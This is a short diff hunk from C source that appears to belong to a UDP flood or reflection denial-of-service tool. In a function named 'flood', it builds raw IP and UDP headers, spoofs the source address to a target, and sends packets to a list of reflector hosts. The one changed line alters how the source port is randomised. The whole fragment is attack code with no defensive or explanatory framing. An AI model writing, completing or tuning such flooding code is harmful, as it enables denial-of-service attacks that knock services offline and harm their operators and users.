@@ -96,7 +96,7 @@ void *flood(void *par1)
         memset(datagram, 0, MAX_PACKET_SIZE);
         setup_ip_header(iph);
         setup_udp_header(udph);
-        udph->source = htons(rand() % 65535 - 1026);
+        udph->source = htons(10000 + (rand_cmwc() % (55535)));
         iph->saddr = sin.sin_addr.s_addr;
         iph->daddr = list_node->data.sin_addr.s_addr;
         iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
